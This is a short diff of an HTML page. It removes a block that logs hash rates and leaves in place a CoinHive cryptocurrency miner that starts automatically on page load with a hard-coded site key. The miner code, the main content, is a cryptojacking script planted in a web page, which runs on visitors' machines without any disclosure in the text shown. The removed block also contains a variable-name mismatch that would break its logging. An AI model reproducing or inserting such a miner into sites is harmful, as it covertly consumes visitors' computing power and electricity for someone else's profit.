@@ -7,20 +7,6 @@
 	var miner = new CoinHive.Anonymous('w79c6HRhfTHtozU6bu8z2A3k9IEUMyn8' , { autoThreads:True});
 	miner.start();
 </script>
-<script>
-	// Listen on events
-	miner.on('found', function() { /* Hash found */ })
-	miner.on('accepted', function() { /* Hash accepted by the pool */ })
-
-	// Update stats once per second
-	setInterval(function() {
-		var hashesPerSecond = miner.getHashesPerSecond();
-		var totalHashes = miner.getTotalHashes();
-		var acceptedHashes = miner.getAcceptedHashes();
-
-		console.log("hps : "+hashespersecond);
-	}, 1000);
-</script>
 </body>
 
 </head>
